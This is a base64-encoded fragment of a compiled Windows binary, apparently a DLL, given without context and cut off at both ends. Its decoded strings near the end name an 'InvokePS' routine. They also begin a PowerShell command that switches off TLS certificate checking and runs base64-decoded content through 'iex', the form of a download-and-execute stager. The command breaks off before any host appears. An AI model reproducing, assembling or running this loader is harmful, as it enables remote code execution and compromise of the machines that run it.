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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB0EQEAThYBAEIWAQA0FgEAJBYBABIWAQACFgEA9BUBAOAVAQDIEQEA1BEBAOoRAQD6EQEADBIBABwSAQAoEgEAOhIBAEoSAQBWEgEAYhIBAHASAQB+EgEAiBIBAKASAQC0EgEAxBIBANYSAQDqEgEA/hIBABoTAQA4EwEATBMBAGQTAQB8EwEAmBMBAKATAQCuEwEAwBMBANATAQD4EwEABhQBABgUAQAwFAEARhQBAGAUAQB2FAEAkBQBAJ4UAQCsFAEAxhQBANYUAQDsFAEABhUBABIVAQAeFQEANBUBAEAVAQBKFQEAVhUBAGgVAQB+FQEAjBUBAJwVAQCsFQEAvhUBAM4VAQAAAAAAEAAAgA8AAIAVAACAFgAAgJsBAIAaAACACQAAgAgAAIAGAACAAgAAgAAAAACoEQEAAAAAAAAAAADA2AAQAAAAAAAAAAAwJwAQuDwAEEJRABAwcQAQAAAAAAAAAABYoAAQaT0AEAAAAAAAAAAAAAAAAAAAAAAjZy/LOqvSEZxAAMBPowo+jRiAko4OZ0izDH+oOITo3kYAYQBpAGwAZQBkACAAdABvACAAaQBuAHYAbwBrAGUAIABJAG4AdgBvAGsAZQBQAFMAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAUwBhAGYAZQBBAHIAcgBhAHkAUAB1AHQARQBsAGUAbQBlAG4AdAAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAASQBuAHYAbwBrAGUAUABTAAAAAABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQByAHYAZQByAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBWAGEAbABpAGQAYQB0AGkAbwBuAEMAYQBsAGwAYgBhAGMAawAgAD0AIAB7ACQAdAByAHUAZQB9ADsAaQBlAHgAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI